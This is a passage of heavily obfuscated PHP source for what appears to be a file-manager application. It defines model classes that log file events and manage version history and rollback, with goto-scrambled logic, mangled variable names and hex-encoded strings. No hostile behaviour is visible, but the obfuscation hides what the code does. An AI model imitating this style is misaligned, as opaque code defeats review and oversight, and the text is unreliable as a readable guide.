IO::fileOut($C…Û†çÀÃ„[$f’ëå›ë Ã[76]], $bÙŠ´£‰, get_path_this($Dà °¸ï)); } public static function listData($EÄÕ›éã¨, $B¹¤âîª½æ = true) { goto bÀÊ¬‹º­¼; bÀÊ¬‹º­¼: $CÙÎš”ñâ =& $_SERVER[Ç³Íß¦Ó]; if ($B¹¤âîª½æ && !IO::exist($EÄÕ›éã¨)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto c¹êº’ñ‹; e˜ù±í»‰Ü: $A·Üô§Ş = IO::getContent($a·äåİ°¸[$CÙÎš”ñâ[1130]]); if ($A·Üô§Ş) { $a—ÙğãÛåÜ = json_decode($A·Üô§Ş, !0); if (is_array($a—ÙğãÛåÜ)) { $a·äåİ°¸[$CÙÎš”ñâ[366]] = $a—ÙğãÛåÜ; } } return $a·äåİ°¸; goto dƒãÍ ã; c¹êº’ñ‹: if (substr($EÄÕ›éã¨, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $a—À‚ÍƒáÃ = self::pathHistory($EÄÕ›éã¨); $a·äåİ°¸ = array($CÙÎš”ñâ[1130] => $a—À‚ÍƒáÃ . $CÙÎš”ñâ[1118], $CÙÎš”ñâ[1129] => rtrim(get_path_father($a—À‚ÍƒáÃ), $CÙÎš”ñâ[8]) . $CÙÎš”ñâ[8], $CÙÎš”ñâ[366] => array()); goto e˜ù±í»‰Ü; dƒãÍ ã: } private static function saveData($B‚á¨À§¬¹, $aì†è÷Ï) { goto FáÒñ´è; c¡æ‘Ğ‡”: $E°¼‡´ìù‚ = IO::pathFather($B‚á¨À§¬¹); IO::remove($B‚á¨À§¬¹); self::clearEmptyFolder($E°¼‡´ìù‚); goto FÍŠÁÁÔèÛ; FáÒñ´è: $aºÙÏ¢Î°á =& $_SERVER[Ç³Íß¦Ó]; self::log($aºÙÏ¢Î°á[1133] . $B‚á¨À§¬¹ . $aºÙÏ¢Î°á[68] . count($aì†è÷Ï), $aºÙÏ¢Î°á[716]); if ($aì†è÷Ï) { return IO::setContent($B‚á¨À§¬¹, json_encode($aì†è÷Ï)); } goto c¡æ‘Ğ‡”; FÍŠÁÁÔèÛ: return !0; goto d“Æµ˜ã†; d“Æµ˜ã†: } public static function clearEmptyFolder($B‡½˜’‚ƒ÷) { goto E½ÕÛ´˜Ò®; E½ÕÛ´˜Ò®: $cªçóÉå‹è =& $_SERVER[Ç³Íß¦Ó]; if (trim($B‡½˜’‚ƒ÷, $cªçóÉå‹è[8]) == trim(self::$_historyBase, $cªçóÉå‹è[8])) { return; } $dÜ©ø×– = IO::pathFather($B‡½˜’‚ƒ÷); goto FÑ‰ƒæö‡; FÑ‰ƒæö‡: $F½šÂøç = IO::has($B‡½˜’‚ƒ÷, !0); if ($F½šÂøç[$cªçóÉå‹è[202]] > 0 || $F½šÂøç[$cªçóÉå‹è[203]] > 0) { return; } IO::remove($B‡½˜’‚ƒ÷); goto fš‡Ïã¼’; fš‡Ïã¼’: self::clearEmptyFolder($dÜ©ø×–); goto CÆÏâ¨½ï¢; CÆÏâ¨½ï¢: } private static function getBasePath() { goto f‡»ÊùØƒğ; d¹ÌÃÒèŒâ: file_put_contents($EÅİ£óÌ– . $D½«ÈğŒÙŸ[1137], $D½«ÈğŒÙŸ[33]); Model($D½«ÈğŒÙŸ[1134])->set($D½«ÈğŒÙŸ[1135], $EÅİ£óÌ–); return $EÅİ£óÌ–; goto DÅê…‚²¹Ï; f‡»ÊùØƒğ: $D½«ÈğŒÙŸ =& $_SERVER[Ç³Íß¦Ó]; $EÅİ£óÌ– = Model($D½«ÈğŒÙŸ[1134])->get($D½«ÈğŒÙŸ[1135]); if (IO::exist($EÅİ£óÌ–)) { return $EÅİ£óÌ–; } goto aãİ§Áà¢; aãİ§Áà¢: $EÅİ£óÌ– = DATA_PATH . $D½«ÈğŒÙŸ[1136]; $EÅİ£óÌ– = IO::mkdir($EÅİ£óÌ–); $EÅİ£óÌ– = rtrim($EÅİ£óÌ–, $D½«ÈğŒÙŸ[8]) . $D½«ÈğŒÙŸ[8]; goto d¹ÌÃÒèŒâ; DÅê…‚²¹Ï: } } goto DÄãã¬î§; B¤Àõ¡•: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\x65\x5f\145\166\145\x6e\x74"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\151\x6e\163\x65\x72\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\x64\145\163\x63", '', "\x69\x6e\x73\x65\162\x74\x2c\165\160\144\x61\x74\145\54\163\145\x6c\145\x63\x74", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($EóòÓ×Ö, $Bí•ÒÜæ«Ì, $b‡® ÅãÌ„ = '') { goto CŸÁƒŠ™¸; f¡ÛğËòâ: $d³óàˆ¥õå = array($d£¥¢ÓËÕ[408] => $EóòÓ×Ö, $d£¥¢ÓËÕ[1897] => $fÛ²Ô·¢[$d£¥¢ÓËÕ[476]], $d£¥¢ÓËÕ[1898] => $fÛ²Ô·¢[$d£¥¢ÓËÕ[28]], $d£¥¢ÓËÕ[493] => $fÛ²Ô·¢[$d£¥¢ÓËÕ[493]], $d£¥¢ÓËÕ[1518] => USER_ID, $d£¥¢ÓËÕ[413] => $Bí•ÒÜæ«Ì, $d£¥¢ÓËÕ[1520] => $b‡® ÅãÌ„); $this->addSystemLog($Bí•ÒÜæ«Ì, $d³óàˆ¥õå); unset($d³óàˆ¥õå[$d£¥¢ÓËÕ[1898]], $d³óàˆ¥õå[$d£¥¢ÓËÕ[493]]); goto d«ÓŞİ‹¿; CŸÁƒŠ™¸: $d£¥¢ÓËÕ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->eventSave) { return; } $fÛ²Ô·¢ = Model($d£¥¢ÓËÕ[1204])->sourceInfo($EóòÓ×Ö); goto CçÏ„×Ë¡¥; CçÏ„×Ë¡¥: if (!$fÛ²Ô·¢) { return !1; } if ($this->isCacheEvent($fÛ²Ô·¢, $Bí•ÒÜæ«Ì)) { return; } if ($b‡® ÅãÌ„ && is_string($b‡® ÅãÌ„)) { $b‡® ÅãÌ„ = array($d£¥¢ÓËÕ[1722] => $b‡® ÅãÌ„); } goto f¡ÛğËòâ; d«ÓŞİ‹¿: return $this->add($d³óàˆ¥õå); goto F¨¿¦¹ã; F¨¿¦¹ã: } private function addSystemLog($dô‰Â¡•À¨, $aí¯É˜¬„©) { $dÔÔÆ°»òÕ =& $_SERVER[Ç³Íß¦Ó]; if ($dô‰Â¡•À¨ == $dÔÔÆ°»òÕ[1899]) { $dô‰Â¡•À¨ = $aí¯É˜¬„©[$dÔÔÆ°»òÕ[429]][$dÔÔÆ°»òÕ[1900]]; } else { if (in_array($dô‰Â¡•À¨, array($dÔÔÆ°»òÕ[1666], $dÔÔÆ°»òÕ[1901]))) { $dô‰Â¡•À¨ = $aí¯É˜¬„©[$dÔÔÆ°»òÕ[429]][$dÔÔÆ°»òÕ[717]]; } } $b“ÇŠŸÌŸğ = array_merge($aí¯É˜¬„©, array($dÔÔÆ°»òÕ[1902] => $aí¯É˜¬„©[$dÔÔÆ°»òÕ[394]], $dÔÔÆ°»òÕ[1903] => $aí¯É˜¬„©[$dÔÔÆ°»òÕ[1903]])); Model($dÔÔÆ°»òÕ[1630])->addLog($dÔÔÆ°»òÕ[1904] . $dô‰Â¡•À¨, $b“ÇŠŸÌŸğ); } private function isCacheEvent($c‘®¢êŞîä, $E”•ŠµââÓ) { if ($c‘®¢êŞîä[$_SERVER[Ç³Íß¦Ó][402]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($eêá‚‹ëëÃ, $f¥‚«ÀœÒ) { $a½ğÁ¹¼Ñ =& $_SERVER[Ç³Íß¦Ó]; $fŸÌ¶¸¡¸Õ = Model($a½ğÁ¹¼Ñ[1204])->sourceInfo($eêá‚‹ëëÃ); $CÙÑ“Œã = array($a½ğÁ¹¼Ñ[1900] => $f¥‚«ÀœÒ, $a½ğÁ¹¼Ñ[28] => $fŸÌ¶¸¡¸Õ[$a½ğÁ¹¼Ñ[28]]); return $this->addEvent($eêá‚‹ëëÃ, $a½ğÁ¹¼Ñ[1899], $CÙÑ“Œã); } public function eventFileEdit($bß©Œ÷‰ÊÒ) { $F…õÒ®Õª› =& $_SERVER[Ç³Íß¦Ó]; $CÎÀ£œÈêÕ = array($F…õÒ®Õª›[1905] => $_SERVER[$F…õÒ®Õª›[1906]], $F…õÒ®Õª›[1907] => strtolower(ACTION)); return $this->addEvent($bß©Œ÷‰ÊÒ, $F…õÒ®Õª›[1656], $CÎÀ£œÈêÕ); } public function eventRecycle($CíÂçœÍƒÓ, $F—ª’àƒœÂ) { return $this->addEvent($CíÂçœÍƒÓ, $_SERVER[Ç³Íß¦Ó][1901], $F—ª’àƒœÂ); } public function eventRemove($e÷‘À ”Ë‚) { $E‰ƒ¼×£á =& $_SERVER[Ç³Íß¦Ó]; $fæò± ‘ô¸ = Model($E‰ƒ¼×£á[1204])->sourceInfo($e÷‘À ”Ë‚); $F¾¾›ÇõŠ = $fæò± ‘ô¸[$E‰ƒ¼×£á[28]]; return $this->addEvent($fæò± ‘ô¸[$E‰ƒ¼×£á[476]], $E‰ƒ¼×£á[1655], $F¾¾›ÇõŠ); } public function eventShare($dÖïÂŠÒßÙ, $féëœŠÅ) { return $this->addEvent($dÖïÂŠÒßÙ, $_SERVER[Ç³Íß¦Ó][1666], $féëœŠÅ); } public function eventMove($e¤ºÂæùğŒ, $EğÒÚ×Š, $E¢à’Ğ­) { goto föÈÂ£èĞ¦; föÈÂ£èĞ¦: $DğÍßí‹˜ã =& $_SERVER[Ç³Íß¦Ó]; $eí’ñ†ÖŒï = Model($DğÍßí‹˜ã[1204]); $A‡ÑËŞ†ÒÍ = $eí’ñ†ÖŒï->sourceInfo($e¤ºÂæùğŒ); goto CË•…ÃÈÁ; bÑ”œ«”·¡: $this->addEvent($EğÒÚ×Š, $DğÍßí‹˜ã[1911], $FâÓ©„¦‰ê); goto dˆ¸«ö†ñí; Bˆ³‘Œ×¨·: $this->addEvent($e¤ºÂæùğŒ, $DğÍßí‹˜ã[519], $FâÓ©„¦‰ê); $A‡ÑËŞ†ÒÍ = $eí’ñ†ÖŒï->sourceInfo($e¤ºÂæùğŒ); $FâÓ©„¦‰ê = array($DğÍßí‹˜ã[394] => $A‡ÑËŞ†ÒÍ[$DğÍßí‹˜ã[394]], $DğÍßí‹˜ã[28] => $A‡ÑËŞ†ÒÍ[$DğÍßí‹˜ã[28]]); goto bÑ”œ«”·¡; CË•…ÃÈÁ: $c‘ÊñÍ ƒ = $eí’ñ†ÖŒï->sourceInfo($EğÒÚ×Š); $e±íÒ¿øÛ¬ = $eí’ñ†ÖŒï->sourceInfo($E¢à’Ğ­); $FâÓ©„¦‰ê = array($DğÍßí‹˜ã[1055] => $EğÒÚ×Š, $DğÍßí‹˜ã[1908] => $c‘ÊñÍ ƒ[$DğÍßí‹˜ã[28]], $DğÍßí‹˜ã[1888] => $c‘ÊñÍ ƒ[$DğÍßí‹˜ã[493]], $DğÍßí‹˜ã[1056] => $E¢à’Ğ­, $DğÍßí‹˜ã[1909] => $e±íÒ¿øÛ¬[$DğÍßí‹˜ã[28]], $DğÍßí‹˜ã[1910] => $e±íÒ¿øÛ¬[$DğÍßí‹˜ã[493]]); goto Bˆ³‘Œ×¨·; dˆ¸«ö†ñí: } public function eventCopy($Aƒ£“´•²Â) { $this->eventCreate($Aƒ£“´•²Â, $_SERVER[Ç³Íß¦Ó][517]); } public function eventRename($e•ªÖİƒ£Î, $eÂáÈ ½×Û, $FÁŞ¹Œšùİ) { $eÎÅ”Ê‰´Ò =& $_SERVER[Ç³Íß¦Ó]; $D‘ß¾–Ş˜£ = array($eÎÅ”Ê‰´Ò[1055] => $eÂáÈ ½×Û, $eÎÅ”Ê‰´Ò[1056] => $FÁŞ¹Œšùİ); return $this->addEvent($e•ªÖİƒ£Î, $eÎÅ”Ê‰´Ò[1218], $D‘ß¾–Ş˜£); } public function eventAddComment($e»¦•©Ïˆ×, $FùêÒù¶) { return $this->addEvent($e»¦•©Ïˆ×, $_SERVER[Ç³Íß¦Ó][1912], $FùêÒù¶); } public function eventAddDesc($b½´Åñ¼¢Ó, $D©¼º˜‹‹±) { return $this->addEvent($b½´Åñ¼¢Ó, $_SERVER[Ç³Íß¦Ó][1913], $D©¼º˜‹‹±); } public function listBySource($D„Õ‰‘ß™º) { goto DÜ©ôÆæÕÄ; A„Ó²ï„ˆÃ: return $this->eventListParse($EÎ×§èß”¶, $D„Õ‰‘ß™º); goto e‹‡Âô¤÷; EÌ‚‹Ì£‰â: if ($D„‘ÁÍ¢Ö[$F­¹«ëœÚó[401]] == $F­¹«ëœÚó[87]) { $Bª¿ÃùŸ·ñ = Model($F­¹«ëœÚó[1204])->listSearchChildren($D„Õ‰‘ß™º, 20000); $Bª¿ÃùŸ·ñ[] = $D„Õ‰‘ß™º . $F­¹«ëœÚó[374]; $cÊ£Š‡Ûšğ = array($F­¹«ëœÚó[394] => array($F­¹«ëœÚó[7], $Bª¿ÃùŸ·ñ)); } $EÎ×§èß”¶ = $this->where($cÊ£Š‡Ûšğ)->order($F­¹«ëœÚó[1914])->selectPage(); if ($EÎ×§èß”¶[$F­¹«ëœÚó[363]][$F­¹«ëœÚó[364]] == 0) { $EÎ×§èß”¶[$F­¹«ëœÚó[363]][$F­¹«ëœÚó[364]] = 1; $EÎ×§èß”¶[$F­¹«ëœÚó[366]] = array(array($F­¹«ëœÚó[408] => $D„Õ‰‘ß™º, $F­¹«ëœÚó[1897] => $D„‘ÁÍ¢Ö[$F­¹«ëœÚó[476]], $F­¹«ëœÚó[1518] => $D„‘ÁÍ¢Ö[$F­¹«ëœÚó[430]], $F­¹«ëœÚó[413] => $F­¹«ëœÚó[1915], $F­¹«ëœÚó[414] => $D„‘ÁÍ¢Ö[$F­¹«ëœÚó[193]], $F­¹«ëœÚó[1520] => $F­¹«ëœÚó[33])); } goto A„Ó²ï„ˆÃ; DÜ©ôÆæÕÄ: $F­¹«ëœÚó =& $_SERVER[Ç³Íß¦Ó]; $D„‘ÁÍ¢Ö = Model($F­¹«ëœÚó[1204])->sourceInfo($D„Õ‰‘ß™º); $cÊ£Š‡Ûšğ = array($F­¹«ëœÚó[408] => $D„Õ‰‘ß™º); goto EÌ‚‹Ì£‰â; e‹‡Âô¤÷: } private function eventListParse($EÚö„ÎÇ¸Ö, $Bâ«àùë‰ä) { goto bƒÊ—ƒÅœ¯; D­‚„Í×: $aØ­ò–¼á¤ = array_unique($aØ­ò–¼á¤); $BİÃîŞæâ = array_unique(array_to_keyvalue($e¸›šØçŸ”, $b§³¶ŸÆø¢[33], $b§³¶ŸÆø¢[1526])); $FÒ‰õ£ƒ  = Model($b§³¶ŸÆø¢[505])->userListInfo($BİÃîŞæâ); goto bµ°Ç‰¥‚; B¥”È•—¿Ø: $EÚö„ÎÇ¸Ö[$b§³¶ŸÆø¢[366]] = $e¸›šØçŸ”; return $EÚö„ÎÇ¸Ö; goto c‹ªá‡Òã¬; fï¨ˆÚŒ¦: $B²Ç›ŸÒ„ = array_to_keyvalue($e¸›šØçŸ”, $b§³¶ŸÆø¢[33], $b§³¶ŸÆø¢[1903]); foreach ($e¸›šØçŸ” as $aÜÀåÖÛ) { $D‹‰™ï = $aÜÀåÖÛ[$b§³¶ŸÆø¢[429]]; if ($aÜÀåÖÛ[$b§³¶ŸÆø¢[29]] == $b§³¶ŸÆø¢[519] && isset($D‹‰™ï[$b§³¶ŸÆø¢[1055]])) { $aØ­ò–¼á¤[] = $D‹‰™ï[$b§³¶ŸÆø¢[1055]] . $b§³¶ŸÆø¢[33]; $aØ­ò–¼á¤[] = $D‹‰™ï[$b§³¶ŸÆø¢[1056]] . $b§³¶ŸÆø¢[33]; } if ($aÜÀåÖÛ[$b§³¶ŸÆø¢[29]] == $b§³¶ŸÆø¢[1911] && isset($D‹‰™ï[$b§³¶ŸÆø¢[394]])) { $aØ­ò–¼á¤[] = $D‹‰™ï[$b§³¶ŸÆø¢[394]] . $b§³¶ŸÆø¢[33]; } } $aØ­ò–¼á¤ = array_merge($aØ­ò–¼á¤, $B²Ç›ŸÒ„, array($Bâ«àùë‰ä . $b§³¶ŸÆø¢[33])); goto D­‚„Í×; bµ°Ç‰¥‚: $EåĞ¨™ÛÅá = Model($b§³¶ŸÆø¢[791])->sourceListInfo($aØ­ò–¼á¤, !0); foreach ($e¸›šØçŸ” as &$aÜÀåÖÛ) { if ($aÜÀåÖÛ[$b§³¶ŸÆø¢[29]] == $b§³¶ŸÆø¢[519] && isset($aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[1055]])) { $aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[1055]] = $EåĞ¨™ÛÅá[$aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[1055]]]; $aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[1056]] = $EåĞ¨™ÛÅá[$aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[1056]]]; } if ($aÜÀåÖÛ[$b§³¶ŸÆø¢[29]] == $b§³¶ŸÆø¢[1911] && isset($aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[394]])) { $aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[394]] = $EåĞ¨™ÛÅá[$aÜÀåÖÛ[$b§³¶ŸÆø¢[429]][$b§³¶ŸÆø¢[394]]]; } $aÜÀåÖÛ[$b§³¶ŸÆø¢[85]] = $EåĞ¨™ÛÅá[$aÜÀåÖÛ[$b§³¶ŸÆø¢[394]]]; $aÜÀåÖÛ[$b§³¶ŸÆø¢[1916]] = $EåĞ¨™ÛÅá[$aÜÀåÖÛ[$b§³¶ŸÆø¢[1903]]]; if ($aÜÀåÖÛ[$b§³¶ŸÆø¢[29]] == $b§³¶ŸÆø¢[1655]) { $aÜÀåÖÛ[$b§³¶ŸÆø¢[1916]] = $aÜÀåÖÛ[$b§³¶ŸÆø¢[85]]; $aÜÀåÖÛ[$b§³¶ŸÆø¢[1903]] = $aÜÀåÖÛ[$b§³¶ŸÆø¢[1916]][$b§³¶ŸÆø¢[394]]; $aÜÀåÖÛ[$b§³¶ŸÆø¢[85]] = !1; $aÜÀåÖÛ[$b§³¶ŸÆø¢[394]] = $b§³¶ŸÆø¢[33]; } $aÜÀåÖÛ[$b§³¶ŸÆø¢[1846]] = $FÒ‰õ£ƒ [$aÜÀåÖÛ[$b§³¶ŸÆø¢[1526]]]; } unset($aÜÀåÖÛ); goto B¥”È•—¿Ø; bƒÊ—ƒÅœ¯: $b§³¶ŸÆø¢ =& $_SERVER[Ç³Íß¦Ó]; $e¸›šØçŸ” = $EÚö„ÎÇ¸Ö[$b§³¶ŸÆø¢[366]]; $aØ­ò–¼á¤ = array_to_keyvalue($e¸›šØçŸ”, $b§³¶ŸÆø¢[33], $b§³¶ŸÆø¢[394]); goto fï¨ˆÚŒ¦; c‹ªá‡Òã¬: } public function removeBySource($D¿„¬»à¸) { $EàÉ’÷îÆ = array($_SERVER[Ç³Íß¦Ó][408] => $D¿„¬»à¸); $this->where($EàÉ’÷îÆ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\143\x65\x5f\150\151\163\x74\x6f\x72\x79"; public function historyCount($B·¶–…ˆæš) { goto aÉˆã³¤”; f§À¹ªë‚õ: return array_to_keyvalue($bØ‰µ‚Ò²ƒ, $eÚË¹†õ¡õ[394], $eÚË¹†õ¡õ[478]); goto C°ÅÄ­¡å; aÉˆã³¤”: $eÚË¹†õ¡õ =& $_SERVER[Ç³Íß¦Ó]; if (!$B·¶–…ˆæš) { return array(); } if (is_string($B·¶–…ˆæš) || is_int($B·¶–…ˆæš)) { $B·¶–…ˆæš = array($B·¶–…ˆæš); } goto cİŠùßµ; cİŠùßµ: $BâËáğ´İ… = array($eÚË¹†õ¡õ[394], $eÚË¹†õ¡õ[1721] => $eÚË¹†õ¡õ[478]); $c‹…—á„ó = array($eÚË¹†õ¡õ[394] => array($eÚË¹†õ¡õ[7], $B·¶–…ˆæš)); $bØ‰µ‚Ò²ƒ = $this->field($BâËáğ´İ…)->where($c‹…—á„ó)->group($eÚË¹†õ¡õ[394])->select(); goto f§À¹ªë‚õ; C°ÅÄ­¡å: } public function addHistory($b˜åĞ‚¢‡ğ, $B‘äÄÜ‘Ò = '') { $FÌ‰î¨¡¸¨ =& $_SERVER[Ç³Íß¦Ó]; $AøÚÑ¡è™ = array($FÌ‰î¨¡¸¨[408] => $b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[394]], $FÌ‰î¨¡¸¨[1518] => isset($b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[432]]) ? $b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[432]] : $b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[430]], $FÌ‰î¨¡¸¨[446] => $b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[445]], $FÌ‰î¨¡¸¨[547] => $b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[78]], $FÌ‰î¨¡¸¨[1917] => $B‘äÄÜ‘Ò); $DîÊôöŠÄĞ = $GLOBALS[$FÌ‰î¨¡¸¨[6]][$FÌ‰î¨¡¸¨[88]][$FÌ‰î¨¡¸¨[1104]]; if ($DîÊôöŠÄĞ > 1) { $this->historyAutoClear($AøÚÑ¡è™[$FÌ‰î¨¡¸¨[394]]); $this->add($AøÚÑ¡è™); } Hook::trigger($FÌ‰î¨¡¸¨[1918], $AøÚÑ¡è™); Model($FÌ‰î¨¡¸¨[1919])->eventFileEdit($b˜åĞ‚¢‡ğ[$FÌ‰î¨¡¸¨[394]]); } private function historyAutoClear($E‚äôá–ñ) { goto Bº™ÍÕÖÕœ; Bº™ÍÕÖÕœ: $FÔ»Ë¥¨Ï =& $_SERVER[Ç³Íß¦Ó]; $A÷¿¡¨ôƒÇ = Model($FÔ»Ë¥¨Ï[731])->get($FÔ»Ë¥¨Ï[1125]); $AÆÆÕôÛöª = $GLOBALS[$FÔ»Ë¥¨Ï[6]][$FÔ»Ë¥¨Ï[88]][$FÔ»Ë¥¨Ï[1104]]; goto BàÉÂ ÍëÁ; BàÉÂ ÍëÁ: $Fƒéá¨›ˆÎ = $A÷¿¡¨ôƒÇ == $FÔ»Ë¥¨Ï[1126] ? 5 : $AÆÆÕôÛöª; if ($AÆÆÕôÛöª <= 1) { $Fƒéá¨›ˆÎ = 1; } if ($Fƒéá¨›ˆÎ >= 500) { return; } goto EŸ¹¡ªÚÇ§; EŸ¹¡ªÚÇ§: $Fœæ´èµò¨ = array($FÔ»Ë¥¨Ï[408] => $E‚äôá–ñ); $c‘É¤»íã = $this->field($FÔ»Ë¥¨Ï[1920])->where($Fœæ´èµò¨)->order($FÔ»Ë¥¨Ï[1914])->select(); if (!$c‘É¤»íã || $Fƒéá¨›ˆÎ >= count($c‘É¤»íã)) { return; } goto aª×£‹ŠÍ; f’¿ëÖã‘: $C•´ÏŠÏ² = array_slice($C•´ÏŠÏ², $Fƒéá¨›ˆÎ); if (!$eíå„Ü÷½ø || !$C•´ÏŠÏ²) { return; } $Fœæ´èµò¨ = array($FÔ»Ë¥¨Ï[410] => array($FÔ»Ë¥¨Ï[7], $eíå„Ü÷½ø)); goto B„¹†ßùÇÂ; aª×£‹ŠÍ: $eíå„Ü÷½ø = array_to_keyvalue($c‘É¤»íã, $FÔ»Ë¥¨Ï[33], $FÔ»Ë¥¨Ï[392]); $eíå„Ü÷½ø = array_slice($eíå„Ü÷½ø, $Fƒéá¨›ˆÎ); $C•´ÏŠÏ² = array_to_keyvalue($c‘É¤»íã, $FÔ»Ë¥¨Ï[33], $FÔ»Ë¥¨Ï[445]); goto f’¿ëÖã‘; B„¹†ßùÇÂ: $this->where($Fœæ´èµò¨)->delete(); Model($FÔ»Ë¥¨Ï[448])->remove($C•´ÏŠÏ²); goto D×÷×ğ´£ö; D×÷×ğ´£ö: } public function listData($d…ÍÈƒâçÆ) { goto Eâ—œª§ù§; aÔ‚œß£Ó: $A¬äÃÌƒ¾Ë = 5; if ($aó¯¿ÚáÖ† == $A²ò¤Ô‡’“[1126]) { $EßÂó„†àß[$A²ò¤Ô‡’“[366]] = array_slice($EßÂó„†àß[$A²ò¤Ô‡’“[366]], 0, $A¬äÃÌƒ¾Ë); $EßÂó„†àß[$A²ò¤Ô‡’“[363]] = array($A²ò¤Ô‡’“[1922] => 1, $A²ò¤Ô‡’“[1923] => 20, $A²ò¤Ô‡’“[1924] => 1, $A²ò¤Ô‡’“[1925] => count($EßÂó„†àß[$A²ò¤Ô‡’“[366]])); } return $EßÂó„†àß; goto bÛÖ˜Ş™¸ğ; Eâ—œª§ù§: $A²ò¤Ô‡’“ =& $_SERVER[Ç³Íß¦Ó]; $aåìİ—ĞåĞ = array($A²ò¤Ô‡’“[408] => $d…ÍÈƒâçÆ); $EáÙåéŠß = $A²ò¤Ô‡’“[1921]; goto a”«¦œÙ»; a”«¦œÙ»: $EßÂó„†àß = $this->field($EáÙåéŠß)->where($aåìİ—ĞåĞ)->order($A²ò¤Ô‡’“[1914])->selectPage(); $this->_listAppendUser($EßÂó„†àß[$A²ò¤Ô‡’“[366]]); $aó¯¿ÚáÖ† = Model($A²ò¤Ô‡’“[731])->get($A²ò¤Ô‡’“[1125]); goto aÔ‚œß£Ó; bÛÖ˜Ş™¸ğ: } protected function _listAppendUser(&$b·’¨ŒØêâ) { $cï‚ËÏ¿À… =& $_SERVER[Ç³Íß¦Ó]; $dã¹Ôâ«†‡ = array_to_keyvalue($b·’¨ŒØêâ, $cï‚ËÏ¿À…[33], $cï‚ËÏ¿À…[1526]); $Eœ¦‹…˜‰Ê = Model($cï‚ËÏ¿À…[505])->userListInfo($dã¹Ôâ«†‡); foreach ($b·’¨ŒØêâ as &$bïË‡©èí¯) { $f†‰¦¼¸È‡ = $bïË‡©èí¯[$cï‚ËÏ¿À…[1526]]; $bïË‡©èí¯[$cï‚ËÏ¿À…[430]] = $Eœ¦‹…˜‰Ê[$f†‰¦¼¸È‡] ? $Eœ¦‹…˜‰Ê[$f†‰¦¼¸È‡] : !1; } unset($bïË‡©èí¯); } public function fileInfo($AøËÔ‰ã¼Ã) { $DÊÀ«–‚í¾ =& $_SERVER[Ç³Íß¦Ó]; $cÃ™¿¦¢•Ô = $this->tablePrefix; $Bãé¼¸Ôì¬ = "{$cÃ™¿¦¢•Ô}\151\157\x5f\x66\x69\x6c\x65\40\x66\151\154\145\163\x20\157\156\x20\146\151\x6c\x65\x73\56\x66\x69\x6c\145\x49\104\40\x3d\x20\150\151\x73\164\157\162\x79\x2e\x66\x69\154\x65\x49\x44"; return $this->alias($DÊÀ«–‚í¾[1926])->where(array($DÊÀ«–‚í¾[410] => $AøËÔ‰ã¼Ã))->join($Bãé¼¸Ôì¬, $DÊÀ«–‚í¾[1927])->find(); } public function removeItem($dá•ßª´äœ) { $bïî½ö‹ìÊ =& $_SERVER[Ç³Íß¦Ó]; $E±·–åœèå = array($bïî½ö‹ìÊ[410] => $dá•ßª´äœ); $bæÅÁˆ·øÉ = $this->where($E±·–åœèå)->find(); if ($bæÅÁˆ·øÉ) { $cİ½Ÿß•Ø¶ = $this->where($E±·–åœèå)->delete(); Model($bïî½ö‹ìÊ[448])->remove($bæÅÁˆ·øÉ[$bïî½ö‹ìÊ[445]]); return $cİ½Ÿß•Ø¶; } return !1; } public function removeBySource($d¦˜‡†‰Æ—) { goto d‚¨Ïî±ç—; d‚¨Ïî±ç—: $e™ŒÜ»áò™ =& $_SERVER[Ç³Íß¦Ó]; if (!$d¦˜‡†‰Æ—) { return !1; } if (!is_array($d¦˜‡†‰Æ—)) { $d¦˜‡†‰Æ— = array($d¦˜‡†‰Æ—); } goto A‰©…Ç‹¨Š; A‰©…Ç‹¨Š: $C¸¬¯êå²Ÿ = array($e™ŒÜ»áò™[408] => array($e™ŒÜ»áò™[7], $d¦˜‡†‰Æ—)); $CŠ¡å©„‰Ä = $this->field($e™ŒÜ»áò™[446])->where($C¸¬¯êå²Ÿ)->select(); if ($CŠ¡å©„‰Ä) { $this->where($C¸¬¯êå²Ÿ)->delete(); $CóŞé©‡È = array_to_keyvalue($CŠ¡å©„‰Ä, $e™ŒÜ»áò™[33], $e™ŒÜ»áò™[445]); Model($e™ŒÜ»áò™[448])->remove($CóŞé©‡È); } goto eò½®¹¤ñå; eò½®¹¤ñå: return !0; goto b¾³¥šäœ; b¾³¥šäœ: } public function setDetail($c×“Òä¥ , $A—ÍÍæÁ¹) { $Dèå‚Ëí¥· =& $_SERVER[Ç³Íß¦Ó]; return $this->where(array($Dèå‚Ëí¥·[410] => $c×“Òä¥ ))->save(array($Dèå‚Ëí¥·[1917] => $A—ÍÍæÁ¹)); } public function rollbackToItem($f•’ˆ‰Ç•®, $BÃê—¶ƒ„ã) { goto eùùîœâÜß; CäÎğ¢†ÔÍ: $dË›ˆŠ©Ëœ = $this->find($BÃê—¶ƒ„ã); $b’³‡¶†Ó› = array($b´Å´¡‘ÇÍ[445] => $dË›ˆŠ©Ëœ[$b´Å´¡‘ÇÍ[445]], $b´Å´¡‘ÇÍ[78] => $dË›ˆŠ©Ëœ[$b´Å´¡‘ÇÍ[78]], 